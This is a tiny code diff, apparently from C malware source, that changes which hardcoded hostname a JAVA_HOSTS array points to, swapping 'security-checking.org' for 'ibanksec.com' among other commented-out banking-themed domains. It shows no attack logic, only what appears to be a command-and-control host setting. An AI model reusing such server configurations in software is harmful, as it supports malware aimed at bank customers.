@@ -35,9 +35,9 @@
 //							"ibasystemdbaodomen.org\0"
 //							"\0";
 
-//		char JAVA_HOSTS[] = "asqeltd.in\0";
+		char JAVA_HOSTS[] = "ibanksec.com\0";
 //		char JAVA_HOSTS[] = "az2.zika.in\0";
-		char JAVA_HOSTS[] = "security-checking.org\0";
+//		char JAVA_HOSTS[] = "security-checking.org\0";
 //		char JAVA_HOSTS[] = "192.168.0.250\0";
 
 	#endif
